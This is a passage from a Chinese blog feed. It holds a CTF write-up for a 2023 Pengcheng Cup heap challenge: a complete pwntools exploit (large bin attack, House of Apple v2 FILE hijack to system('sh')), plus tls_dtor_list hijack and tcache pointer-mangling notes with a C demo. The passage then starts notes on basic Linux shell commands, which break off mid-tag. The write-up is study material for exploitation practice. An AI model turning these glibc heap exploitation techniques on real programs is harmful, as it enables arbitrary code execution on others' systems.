class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itob</span>(<span class="params">num</span>): <span class="keyword">return</span> <span class="built_in">str</span>(num).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>):</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;babyheap&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>, itob(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz, con</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, itob(sz))</span><br><span class="line">    sa(<span class="string">b&quot;input your name&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, sz, con</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line">    sla(<span class="string">b&quot;input your name size&quot;</span>, itob(sz))</span><br><span class="line">    sa(<span class="string">b&quot;input your name&quot;</span>, con)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input index&quot;</span>, itob(idx))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">heap_base = heap_addr - <span class="number">0x2a0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&#x27;a\n&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x448</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x0</span>: heap_base+<span class="number">0x2b0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x8</span>: heap_base+<span class="number">0x2b0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x410</span>: <span class="number">0x420</span></span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x418</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - <span class="number">0x1d3ce0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x0</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x8</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0x420</span>: <span class="number">0x430</span></span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x428</span>, payload)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ## large bin attack =&gt; IO_list_all -&gt; chunk0</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">payload = fit(&#123;</span><br><span class="line">    <span class="number">0x18</span>: libc.sym._IO_list_all - <span class="number">0x20</span>,</span><br><span class="line">&#125;, filler = <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(payload) + <span class="number">1</span>, payload + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>, <span class="string">b&quot;a\n&quot;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # house of apple v2</span></span><br><span class="line">fs = FileStructure()</span><br><span class="line">fs.vtable = libc.sym._IO_wfile_jumps</span><br><span class="line"><span class="comment"># write_base &lt; write_ptr</span></span><br><span class="line">fs._IO_write_base = <span class="number">0</span></span><br><span class="line">fs._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fs.chain = <span class="number">0</span></span><br><span class="line"><span class="comment"># fs._lock = libc.sym._IO_stdfile_2_lock</span></span><br><span class="line"><span class="comment"># lock 检查</span></span><br><span class="line">fs._lock = libc.address + <span class="number">0x1d5a20</span></span><br><span class="line"><span class="comment"># # codecvt = ?</span></span><br><span class="line"><span class="comment"># fs._codecvt = ?</span></span><br><span class="line">fs._wide_data = heap_base + <span class="number">0xff0</span> + <span class="number">0x500</span></span><br><span class="line">payload = <span class="built_in">bytes</span>(fs)[<span class="number">0x10</span>:]</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(payload) + <span class="number">1</span>, payload + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">wdata = fit(&#123;</span><br><span class="line">    <span class="number">0xe0</span>-<span class="number">0x10</span>: heap_base+<span class="number">0xff0</span>+<span class="number">0xe0</span>+<span class="number">0x10</span>+<span class="number">0x500</span>,</span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0x68</span>: libc.sym.system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="built_in">len</span>(wdata) + <span class="number">1</span>, wdata + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;heap_addr&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x4f0</span> + <span class="string">b&quot;     sh;&quot;</span>  <span class="comment"># flag rdi</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>


<p>主要利用large bin leak，但是因为其可以使用tcache bin，看到了其他的利用手段</p>
<ul>
<li>最终tcache修改TLS，通过__call_tls_dtors函数实现system(“&#x2F;bin&#x2F;sh”)</li>
<li>IO leak 栈地址，然后跳转到栈上进行指向函数。</li>
</ul>
<h3 id="tls-dtor"><a href="#tls-dtor" class="headerlink" title="tls_dtor"></a>tls_dtor</h3><p>一种比较简单的利用手段，正常情况下存在如下的调用链</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">	__run_exit_handlers</span><br><span class="line">		__call_tls_dtors</span><br></pre></td></tr></table></figure>

<p>其函数实现如下</p>
<ul>
<li>一个全局变量是否存在</li>
<li>找到其函数指针</li>
<li><code>PTR_DEMANGLE</code> 计算函数地址</li>
<li>调用函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">dtor_list</span> *cur = tls_dtor_list;</span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line">      <span class="built_in">PTR_DEMANGLE</span> (func);</span><br><span class="line"></span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      <span class="built_in">func</span> (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Ensure that the MAP dereference happens before</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count decrement.  That way, we protect this access from a</span></span><br><span class="line"><span class="comment">	 potential DSO unload in _dl_close_worker, which happens when</span></span><br><span class="line"><span class="comment">	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span></span><br><span class="line">      <span class="built_in">atomic_fetch_add_release</span> (&amp;cur-&gt;map-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (__call_tls_dtors)</span><br></pre></td></tr></table></figure>

<p>其结构体如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*dtor_func)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// destructor list</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">dtor_list</span></span><br><span class="line">&#123;</span><br><span class="line">  dtor_func func;</span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dtor_list</span> *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>PTR_DEMANGLE 这个宏计算函数地址</p>
<ul>
<li>循环右移0x11位</li>
<li>与 pointer_guard 进行异或</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> PTR_DEMANGLE(reg)	ror $2*LP_SIZE+1, reg;			      \</span></span><br><span class="line"><span class="meta">				xor %fs:POINTER_GUARD, reg</span></span><br></pre></td></tr></table></figure>

<p>正常情况下，这个值为0，不会调用如下的函数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p tls_dtor_list</span><br><span class="line"><span class="variable">$1</span> = (struct dtor_list *) 0x0</span><br></pre></td></tr></table></figure>

<p>因为这里没有什么检查，因此我们可以攻击这个值，让其指向我们伪造的一个 <code>dtor_list</code> 结构体。</p>
<ul>
<li>func 首先获得地址，先于 pointer_guard 进行异或，然后在进行循环左移11位</li>
<li>obj 作为函数参数指针。</li>
</ul>
<p>在汇编中</p>
<ul>
<li>tls_dtor_list 也在 fs 附近</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> tls_dtor_list=1   <span class="comment"># 进入循环，寻找偏移</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p <span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$4</span> = (void *) 0xffffffffffffffb0</span><br><span class="line">pwndbg&gt; p (long)<span class="variable">$rbp</span></span><br><span class="line"><span class="variable">$5</span> = -80</span><br><span class="line"></span><br><span class="line">0x7ffff7e02606 &lt;__call_tls_dtors+6&gt;     mov    rbp, qword ptr [rip + 0x194773]</span><br><span class="line">0x7ffff7e0260d &lt;__call_tls_dtors+13&gt;    mov    rbx, qword ptr fs:[rbp]</span><br><span class="line">0x7ffff7e02612 &lt;__call_tls_dtors+18&gt;    <span class="built_in">test</span>   rbx, rbx                        <span class="comment"># 这里就是tls_dtor_list 值</span></span><br><span class="line">0x7ffff7e02615 &lt;__call_tls_dtors+21&gt;    je     __call_tls_dtors+94                &lt;__call_tls_dtors+94&gt;</span><br><span class="line">0x7ffff7e02617 &lt;__call_tls_dtors+23&gt;    nop    word ptr [rax + rax]</span><br><span class="line">► 0x7ffff7e02620 &lt;__call_tls_dtors+32&gt;    mov    rdx, qword ptr [rbx + 0x18]   <span class="comment"># next 指针</span></span><br><span class="line">0x7ffff7e02624 &lt;__call_tls_dtors+36&gt;    mov    rax, qword ptr [rbx]            <span class="comment"># func</span></span><br><span class="line">0x7ffff7e02627 &lt;__call_tls_dtors+39&gt;    ror    rax, 0x11                       <span class="comment"># 循环右移</span></span><br><span class="line">0x7ffff7e0262b &lt;__call_tls_dtors+43&gt;    xor    rax, qword ptr fs:[0x30]        <span class="comment"># pointer_guard </span></span><br><span class="line">0x7ffff7e02634 &lt;__call_tls_dtors+52&gt;    mov    qword ptr fs:[rbp], rdx</span><br><span class="line">0x7ffff7e02639 &lt;__call_tls_dtors+57&gt;    mov    rdi, qword ptr [rbx + 8]</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/xg <span class="variable">$fs_base</span>+0x30</span><br><span class="line">0x7ffff7dc1770: 0x851e64b26accf332</span><br></pre></td></tr></table></figure>

<p>我们需要将伪造的结构体中函数地址进行一个移位运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">addr</span>):</span><br><span class="line">	<span class="keyword">return</span> ((addr &lt;&lt; <span class="number">0x11</span>) &amp; <span class="number">0xffffffffffffffff</span>) | (addr &gt;&gt; <span class="number">0x2f</span>)</span><br></pre></td></tr></table></figure>

<p>一个小demo，来自 <a href="https://zhuanlan.zhihu.com/p/654914149">glibc2.35-通过tls_dtor_list劫持exit执行流程</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">rotate_left</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> value, <span class="type">int</span> left)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (value &lt;&lt; left) | (value &gt;&gt; (<span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) * <span class="number">8</span> - left));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fs_base;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> index = <span class="number">0xffffffffffffffa8</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> tls_dtor_list_addr;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> random_number;</span><br><span class="line">  <span class="type">void</span> *system_ptr = (<span class="type">void</span> *)&amp;system;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;system:%p\n&quot;</span>, system_ptr);</span><br><span class="line">  <span class="built_in">asm</span>(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(fs_base));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Value in FS register: 0x%llx\n&quot;</span>, fs_base);</span><br><span class="line">  tls_dtor_list_addr = fs_base - <span class="number">80</span>;</span><br><span class="line">  random_number = *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(fs_base + <span class="number">0x30</span>);</span><br><span class="line">  <span class="type">char</span> *str_bin_sh = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(str_bin_sh, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)ptr =</span><br><span class="line">      <span class="built_in">rotate_left</span>((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)system_ptr ^ random_number, <span class="number">0x11</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(ptr + <span class="number">8</span>) = str_bin_sh;</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)tls_dtor_list_addr = ptr;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在高版本 的 tcache bin attack 里也可以使用这个。</p>
<ul>
<li>tcache fd 加密问题。</li>
</ul>
<p>如下为 chunk 放入 tcache bin 相关的函数。</p>
<ul>
<li>因为 header 的存在，第一步将 chunk 转化成 tcache_entry</li>
<li>key 为一个随机数</li>
<li>next指针计算，next指针的地址右移12位，然后与 <code>prev tcache bin</code> 指针进行 <code>xor</code> 运算。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((void*)((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> *next;                <span class="comment">// 常说的 fd 指针 </span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_perthread_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> </span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)<span class="built_in">chunk2mem</span>(chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;      <span class="comment">// 一个随机数，tcache_key_initialize (void) 生成</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = <span class="built_in">PROTECT_PTR</span>(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以做一个测试，查看tcache 的next指针。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555555592a0: 0x0000000555555559      0xa8d3bb0dc1ab0725</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592e0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555555592f0: 0x000055500000c7f9      0xa8d3bb0dc1ab0725</span><br><span class="line">0x555555559300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559320: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x (0x5555555592f0 &gt;&gt; 12) ^ 0x5555555592a0</span><br><span class="line"><span class="variable">$1</span> = 0x55500000c7f9</span><br></pre></td></tr></table></figure>

<p>因此我们伪造fd。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(addr &gt;&gt; <span class="number">12</span>) ^ pos</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://kagehutatsu.com/?p=951">2023 鹏城杯 Pwn 部分Writeup</a></li>
<li><a href="https://blog.xmcve.com/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF2023-Writeup/#title-7">鹏城杯2023 Writeup</a></li>
<li><a href="https://unauth401.tech/pcb2023/#baby-heap">鹏城杯 2023 初赛 Pwn WriteUp</a></li>
<li><a href="https://mp.weixin.qq.com/s/tjz3urSdsQac30JiqVN62Q">2023第三届“鹏城杯”线上初赛WriteUp</a></li>
<li><a href="https://www.cnblogs.com/ZIKH26/articles/16066329.html">DASCTF2022_checkin - ZikH26</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机教育缺失的一课</title>
    <url>/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/</url>
    <content><![CDATA[<blockquote>
<p>the Missing Semester of your CS education</p>
</blockquote>
<span id="more"></span>

<ul>
<li><p>The Missing Semester of your CS education，共<code>11</code>节课，每节课约1h。</p>
<ul>
<li><a href="https://www.bilibili.com/video/BV1uc411N7eK/?spm_id_from=333.999.0.0&vd_source=ccaa27461534d3a4a5e9b964672f86d6">bilibili 双语字幕</a></li>
<li><a href="https://www.youtube.com/playlist?list=PLyzOVJj3bHQuloKGG59rS43e29ro7I57J">Missing Semester IAP 2020</a></li>
</ul>
</li>
<li><p>确实不错，手敲命令+讲解。多使用Linux</p>
</li>
<li><p>学校应该在大一教这个，而不是TM的大学物理</p>
</li>
<li><p>课程网站</p>
</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://missing.csail.mit.edu/</span><br></pre></td></tr></table></figure>

<h2 id="lectrue1-overview-shell"><a href="#lectrue1-overview-shell" class="headerlink" title="lectrue1: overview &amp; shell"></a>lectrue1: overview &amp; shell</h2><blockquote>
<p>主要是 Linux 基本命令</p>
</blockquote>
<h3 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h3><ul>
<li>如何利用存在的工具使我们开发更加高效，以及如何更好的利用我们的计算机，这是这门课主要解决的问题。</li>
</ul>
<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><ul>
<li>讲述了Linux Shell.主要是bash</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">shell是运行在终端中的文本互动程序，bash（GNU Bourne-Again Shell）是最常用的一种shell。是当前大多数Linux发行版的默认Shell。</span><br></pre></td></tr></table></figure>

<ul>
<li>日期</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">date</span></span><br></pre></td></tr></table></figure>

<ul>
<li>打印</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>路径列表</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当我们执行一些命令时，会遍历PATH寻找；比如说使用 /bin/echo 时只需在终端输入 echo 就行</span></span><br><span class="line"><span class="comment"># `:` 分隔</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<ul>
<li>寻找命令的路径</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> <span class="built_in">echo</span></span><br><span class="line">/usr/bin/echo</span><br><span class="line"></span><br><span class="line"><span class="comment"># whereis可以寻找到 原始代码、二进制文件，或是帮助文件</span></span><br><span class="line">$ whereis bash</span><br><span class="line">bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz</span><br></pre></td></tr></table></figure>

<ul>
<li>目录</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># change dir</span></span><br><span class="line">$ <span class="built_in">cd</span> /home/username</span><br><span class="line"></span><br><span class="line"><span class="comment"># `..` 代表上一级目录。`.` 代表当前目录 </span></span><br><span class="line">$ <span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># `-`  当前目录和之前目录下切换</span></span><br><span class="line">$ <span class="built_in">cd</span> /mnt</span><br><span class="line">$ <span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/home</span><br><span class="line">$ <span class="built_in">cd</span> -</span><br><span class="line">/mnt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有趣的一点是，`..`使用过多的情况。`/`目录没有上一级，最高只能到 `/`</span></span><br><span class="line">$ ../../../../../../bin/date</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure>

<ul>
<li>文件操作</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  list: 列出指定目录下所有的文件，默认当前目录</span></span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">test.txt</span><br><span class="line">$ <span class="built_in">ls</span> /</span><br><span class="line">lib root home ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动文件位置 move</span></span><br><span class="line">$ mov test.txt /tmp</span><br><span class="line">$ <span class="built_in">ls</span> /tmp</span><br><span class="line">test.txt</span><br><span class="line"><span class="comment"># 重命名</span></span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ mov test.txt tmp.txt</span><br><span class="line">$ <span class="built_in">ls</span> </span><br><span class="line">tmp.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 copy</span></span><br><span class="line">$ <span class="built_in">cp</span> tmp.txt tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">$ <span class="built_in">rm</span> tmp1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个文件</span></span><br><span class="line">$ <span class="built_in">touch</span> tmp2.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line">$ <span class="built_in">mkdir</span> tmpdir</span><br><span class="line">$ <span class="built_in">rmdir</span> <span 